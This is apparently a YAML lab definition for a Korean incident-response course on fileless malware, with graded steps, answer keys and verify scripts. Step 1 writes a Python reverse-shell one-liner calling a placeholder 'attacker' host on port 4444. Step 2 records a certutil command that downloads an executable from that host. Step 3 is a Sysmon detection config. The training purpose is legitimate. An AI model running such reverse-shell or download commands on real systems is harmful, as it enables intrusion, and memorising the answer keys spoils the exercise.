lab_id: agent-ir-adv-nonai-week09
title: Fileless 악성코드 IR (Non-AI)
version: nonai
course: agent-ir-adv-nonai
week: 9
description: LOLBin·Reflective Load·인터프리터. Memory forensics + AppLocker·WDAC. 학생이
  수동 수행·기록.
difficulty: hard
duration_minutes: 150
objectives:
- 공격 원리를 이해하고 재현한다
- 탐지·분석·초동대응·보고·재발방지의 6단계를 수행한다
- Human vs Agent 대응을 비교한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 리버스 셸 원라이너 (교육)
  hint: 6단계 IR 중 공격 단계. target_vm=web.
  category: attack
  points: 9
  answer: 'mkdir -p ~/w09 && cat > ~/w09/revshell.py <<''PY''

    # 교육용 — 실제 연결 안 함

    code = "python3 -c ''import socket,os; s=socket.socket(); s.connect((\"attacker\",4444))''"

    print(''simulated:'', code)

    PY

    python3 ~/w09/revshell.py'
  answer_detail: '[공격] 실제 연결 없는 교육 버전.'
  verify:
    type: output_contains
    expect: simulated
    field: stdout
  target_vm: web
  script: 'mkdir -p ~/w09 && cat > ~/w09/revshell.py <<''PY''

    # 교육용 — 실제 연결 안 함

    code = "python3 -c ''import socket,os; s=socket.socket(); s.connect((\"attacker\",4444))''"

    print(''simulated:'', code)

    PY

    python3 ~/w09/revshell.py'
  risk_level: low
  bastion_prompt: ''
- order: 2
  instruction: LOLBin 예시 (certutil)
  hint: 6단계 IR 중 공격 단계. target_vm=web.
  category: attack
  points: 10
  answer: 'echo ''certutil -urlcache -split -f http://attacker/a.exe a.exe  # Windows
    LOLBin example'' > ~/w09/lolbin.txt && cat ~/w09/lolbin.txt'
  answer_detail: '[공격] 정당 바이너리로 다운로드.'
  verify:
    type: output_contains
    expect: certutil
    field: stdout
  target_vm: web
  script: 'echo ''certutil -urlcache -split -f http://attacker/a.exe a.exe  # Windows
    LOLBin example'' > ~/w09/lolbin.txt && cat ~/w09/lolbin.txt'
  risk_level: low
  bastion_prompt: ''
- order: 3
  instruction: Sysmon 설정 (Windows 환경)
  hint: 6단계 IR 중 탐지 단계. target_vm=bastion.
  category: analysis
  points: 11
  answer: "cat > ~/w09/sysmon.xml <<'X'\n<Sysmon schemaversion=\"4.70\">\n  <EventFiltering>\n\
    \    <RuleGroup><ProcessCreate onmatch=\"include\"><ParentImage condition=\"end\
    \ with\">powershell.exe</ParentImage></ProcessCreate></RuleGroup>\n    <RuleGroup><NetworkConnect\
    \ onmatch=\"include\"><Image condition=\"end with\">powershell.exe</Image></NetworkConnect></RuleGroup>\n\
    \  </EventFiltering>\n</Sysmon>\nX\ncat ~/w09/sysmon.xml"
  answer_detail: '[탐지] Windows Sysmon 핵심.'
  verify:
    type: output_contains
    expect: powershell
    field: stdout
  target_vm: bastion
  script: "cat > ~/w09/sysmon.xml <<'X'\n<Sysmon schemaversion=\"4.70\">\n  <EventFiltering>\n\
    \    <RuleGroup><ProcessCreate onmatch=\"include\"><ParentImage condition=\"end\
    \ with\">powershell.exe</ParentImage></ProcessCreate></RuleGroup>\n    <RuleGroup><NetworkConnect\
    \ onmatch=\"include\"><Image condition=\"end with\">powershell.exe</Image></NetworkConnect></RuleGroup>\n\
    \  </EventFiltering>\n</Sysmon>\nX\ncat ~/w09/sysmon.xml"
  risk_level: low
  bastion_prompt: ''
- order: 4
